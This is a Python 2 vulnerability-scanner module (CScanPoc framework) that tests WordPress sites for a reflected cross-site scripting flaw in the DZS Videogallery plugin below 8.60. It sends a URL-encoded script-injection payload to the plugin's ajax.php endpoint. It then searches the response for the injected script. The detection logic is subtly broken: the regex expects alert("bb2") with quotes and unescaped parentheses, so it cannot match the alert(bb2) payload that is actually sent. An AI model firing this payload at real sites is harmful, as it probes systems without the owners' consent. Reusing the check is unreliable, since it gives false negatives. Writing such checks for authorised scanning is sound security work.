# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0076' # 平台漏洞编号，留空
    name = 'WordPress DZS Videogallery < 8.60 XSS' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2016-03-11'  # 漏洞公布时间
    desc = '''
        WordPress DZS Videogallery < 8.60 跨站脚本攻击漏洞
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/39553/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress DZS Videogallery < 8.60'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f58043cb-bba9-4562-ae6e-095fedded752'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            code, head, res, errcode, _ = hh.http(url + '/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&height=400&'
                'width=610&type=vimeo&source=%22%2F%3E%3Cscript%3Ealert%28bb2%29%3C%2Fscript%3E')
            if code == 200:
                m = re.search('<script>alert("bb2")</script>', res)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()